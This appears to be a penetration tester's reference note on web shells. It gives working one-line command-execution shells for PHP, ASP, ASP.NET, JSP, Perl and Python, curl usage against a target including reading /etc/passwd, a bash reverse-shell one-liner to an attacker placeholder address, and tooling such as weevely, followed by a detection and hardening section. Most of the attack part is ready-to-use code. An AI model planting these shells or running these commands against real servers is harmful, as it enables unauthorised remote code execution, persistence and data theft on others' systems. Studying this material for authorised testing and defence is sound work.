---
created: 2026-09-26
updated: 2026-10-06
tags:
  - shells
proofread: no
---
>[!abstract]+ Table of contents
>- [[#Web shell]]
>- [[#How a web shell works]]
>- [[#Minimal command web shells]]
>	- [[#PHP]]
>	- [[#ASP and ASP.NET]]
>	- [[#JSP]]
>	- [[#Other interpreters]]
>- [[#Using a web shell]]
>- [[#From a web shell to an interactive shell]]
>- [[#Full-featured web shells and tooling]]
>- [[#Detection and defense]]
>- [[#References and further reading]]
## Web shell

>A **web shell** is a script or program placed on a web server that exposes an HTTP-accessible interface for running commands or code on that server. Each request carries a command, the server-side interpreter executes it, and the output is returned in the HTTP response.

- A web shell turns the web server into the command channel. You interact with the target via standard HTTP(S) requests; commands blends in with legitimate web traffic.
- Unlike a reverse shell, a web shell doesn't require outbound connectivity to your attacking machine, and, unlike a bind shell, it doesn't require a dedicated listener on the target. You interact with an existing web server.
- Because the web shell itself resides on disk on the target web server, it also provides *persistence*: it remains rechable across system reboots until identified and removed (as long as the hosting server remains active).

>[!note] A web shell is stateless by default. Each request represents an independent command execution; the shell doesn't maintain an interactive session, persistent working directory, or environment state between requests unless explicitly implemented.

- A web shell is a **payload**, not a delivery mechanism. Getting the file onto the server and reaching an executable path is a separate problem, covered by the vulnerability that allows it:
	- [[File upload]] — the primary delivery vector; bypassing file upload validation and loading a web shell into an executable directory.
	- [[OS command injection]] — writing the shell payload to the web root via an injected command.
	- LFI (Local File Inclusion) or RFI (Remote File Inclusion), exposed application server administrative interfaces (e.g., deploying a JSP/WAR archive), or any arbitrary file-write primitive targeting an executable web path.

## How a web shell works

1. You place a script (e.g., `shell.php`) in an executable location within the web root or an interpreted directory.
2. Then request the script's URL, passing a command in a parameter, header, or cookie (depends on the web shell implementation).
3. The server-side interpreter executes the script, which passes the command to an OS command execution function.
4. The command runs with the **privileges of the web server process** (often `www-data`, `apache`, `IIS APPPOOL\<site>`, or `NT AUTHORITY\NETWORK SERVICE`), and its output is returned in the HTTP response body.

## Minimal command web shells

- A minimal web shell is a one-liner that reads a command from the request and hands it to a command-execution function. The examples below take the command from a URL query parameter.

>[!note] See  [`SecLists/Web-Shells — danielmiessler, GitHub`](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells).
### PHP

```php
<?php system($_GET['cmd']); ?>
```

- PHP provides multiple command execution functions. If a specific function is restricted via `disable_functions`, alternatives can be used:

```php
<?php passthru($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

```php
<?php echo exec($_GET['cmd']); ?>
```

```php
<?php echo `$_GET[cmd]`; ?>
```

>[!interesting]- How these differ
>- `system()` runs the command and prints its output directly, returning the last line.
>- `passthru()` runs the command and passes the raw output straight through, which suits binary output.
>- `shell_exec()` and the backtick operator return the complete output as a string, requiring `echo` or `print` to write it to the response body.
>- `exec()` returns only the final line of output unless an array variable is passed as the second argument to capture all output lines (`exec($cmd, $output)`).

>[!note] When input filters block standard tags like `<?php` or target specific function names, short tags and alternative execution wrappers can be used. For filter evasion techniques, see [[File upload]].


### ASP and ASP.NET

- Classic ASP (`.asp`) for legacy IIS environments:

```asp
<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request.QueryString("cmd")).StdOut.ReadAll()) %>
```

- ASP.NET (`.aspx`) for .NET-based IIS environments:

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process p = new System.Diagnostics.Process();
   p.StartInfo.FileName = "cmd.exe";
   p.StartInfo.Arguments = "/c " + Request["cmd"];
   p.StartInfo.UseShellExecute = false;
   p.StartInfo.RedirectStandardOutput = true;
   p.Start();
   Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>"); %>
```

### JSP

- For Java application servers (such as Apache Tomcat, WildFly/JBoss, Oracle WebLogic), a JSP web shell can be deployed directly or packaged inside a `.war` archive:

```jsp
<%@ page import="java.util.*,java.io.*" %>
<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String line; while ((line = r.readLine()) != null) { out.println(line); } %>
```

### Other interpreters

- Perl CGI (`.pl`, `.cgi`) in executable CGI directories (e.g., `cgi-bin`):

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print `$ENV{'QUERY_STRING'}`;
```

- Python CGI (`.py`) on web servers configured for CGI script execution:

```python
#!/usr/bin/env python3
import cgi, subprocess
print("Content-Type: text/html\n")
c = cgi.FieldStorage().getvalue("cmd", "")
print(subprocess.getoutput(c))
```

## Using a web shell

- A web shell can be accessed using any HTTP client. In a web browser, pass the command as a query parameter:

```
https://target.tld/uploads/shell.php?cmd=id
```

- From the command line, `curl` enables direct terminal interaction and automated scripting:

```bash
curl "https://target.tld/uploads/shell.php?cmd=id"
```

- Command parameters must be **URL-encoded** (e.g., spaces as `%20` or `+`, `&` as `%26`) to prevent query string delimiter collisions. The `--data-urlencode` flag in `curl` handles encoding automatically when combined with `-G`:

```bash
curl -G "https://target.tld/uploads/shell.php" --data-urlencode "cmd=cat /etc/passwd"
```

>[!tip] Unformatted web shell output can lose line breaks when viewed in a browser. Enclosing output in `<pre>` tags within the payload or stripping surrounding HTML tags from CLI responses preserves formatting.

## From a web shell to an interactive shell

- Minimal web shells lack persistent working directories, environment state, and interactive terminal capabilities (such as job control and tab completion). Consequently, web shells are typically used to bootstrap an interactive shell session.

- Execute a reverse shell one-liner via the web shell to establish a connection back to a listening handler (payload examples are cataloged in [[Reverse shells]]):

```bash
curl -G "https://target.tld/uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker_ip_address>/1337 0>&1'"
```

- Because the web server process spawns the shell without an allocated pseudo-terminal (PTY), the initial session is non-interactive. Upgrade the session to a fully interactive TTY as described in [[🛠️ Upgrading shells]].

>[!note] When egress filtering blocks outbound traffic, reverse shells cannot connect back. In restricted environments, communication must remain over HTTP/HTTPS using advanced web shell frameworks.

## Full-featured web shells and tooling

- Full-featured web shell frameworks provide client-side terminal interfaces, persistent pseudo-state, file management, and encrypted or authenticated communication channels.

| Tool | Language | Purpose |
| :--- | :--- | :--- |
| [`weevely`](https://github.com/epinna/weevely3) | PHP | Generate a stealthy, password-protected PHP shell and drive it from a client with a terminal and post-exploitation modules. |
| [`p0wny-shell`](https://github.com/flozz/p0wny-shell) | PHP | Serve a single-file PHP shell with a semi-interactive web UI and a persistent working directory. |
| `Antak` (from [Nishang](https://github.com/samratashok/nishang)) | ASP.NET | Provide a PowerShell web shell for IIS targets. |
| `Laudanum` | Multi | Provide pre-built injectable shells for PHP, ASP, ASPX, JSP, and Perl (located in Kali Linux under `/usr/share/laudanum`). |
| `China Chopper` | Multi | Provide a compact server-side payload managed through a dedicated client application. |

- Kali ships a collection of ready-to-use web shells under `/usr/share/webshells/`, grouped by language:

```bash
ls /usr/share/webshells/
```

- `weevely` generates an obfuscated, password-protected PHP web shell and provides an interactive terminal client over HTTP:

```bash
weevely generate <password> shell.php
weevely https://target.tld/uploads/shell.php <password>
```

- Metasploit can generate web shell payloads and tunnel interactive sessions over HTTP. Deploying a PHP Meterpreter payload provides a Meterpreter session operating over the web port (see [[🛠️ Metasploit & MSFvenom]] for MSFvenom payload generation and handler configuration).

>[!note] Widely known web shells (`c99`, `r57`, `wso`, China Chopper) possess well-established static signatures and behavioral detection patterns across EDR and WAF solutions. While functional in lab environments, they are readily detected on monitored systems.

## Detection and defense

- Web shells represent a primary post-exploitation persistence mechanism, requiring host-based and network-level defensive measures:

- Detection:
	- **File Integrity Monitoring (FIM):** Monitor web-accessible directories for newly created or modified executable files, particularly within user-upload directories.
	- **Signature and Heuristic Scanning:** Scan web directories with tools such as YARA, `NeoPI`, or [`LOKI`](https://github.com/Neo23x0/Loki) to detect known web shell signatures, high-entropy obfuscation, and dangerous execution functions.
	- **Log Analysis:** Inspect web server access logs for anomalous query parameters (e.g., `cmd=`, `c=`, `exec=`), abnormal `User-Agent` headers, and excessive requests directed to static or uploaded files.
	- **Process Monitoring:** Monitor web server service accounts (e.g., `www-data`, `apache`, `w3wp.exe`) for anomalous child processes, such as shells (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) or reconnaissance utilities (`whoami`, `id`, `net.exe`, `nc`).

- Hardening:
	- Store uploaded files **outside the web root** or configure web server directives to disable script execution within upload directories.
	- Restrict interpreter execution capabilities (e.g., configuring PHP `disable_functions = system,exec,shell_exec,passthru,popen,proc_open` and restricting filesystem scope via `open_basedir`).
	- Execute the web server under a dedicated, low-privilege service account following least-privilege principles.
	- Enforce strict **egress filtering** to prevent web shells from establishing outbound reverse shell connections.

## References and further reading

- [`SecLists/Web-Shells — danielmiessler, GitHub`](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
- [`Web shells — MITRE ATT&CK T1505.003`](https://attack.mitre.org/techniques/T1505/003/)
- [`Upload Insecure Files — Payloads All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)
- [`weevely3 — epinna, GitHub`](https://github.com/epinna/weevely3)
- [`Detecting and preventing web shells — CISA/NSA`](https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF)
